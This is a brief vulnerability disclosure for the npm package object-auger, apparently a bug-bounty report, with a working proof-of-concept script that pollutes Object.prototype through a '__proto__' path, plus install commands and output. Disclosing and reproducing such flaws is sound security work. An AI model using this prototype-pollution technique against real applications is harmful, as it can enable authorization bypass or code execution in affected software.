# Description

`object-auger` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var objectAuger = require("object-auger")
var obj = {}
console.log("Before : " + {}.polluted);
objectAuger.set(obj,["__proto__","polluted"],"Yes! Its Polluted");
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i object-auger # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
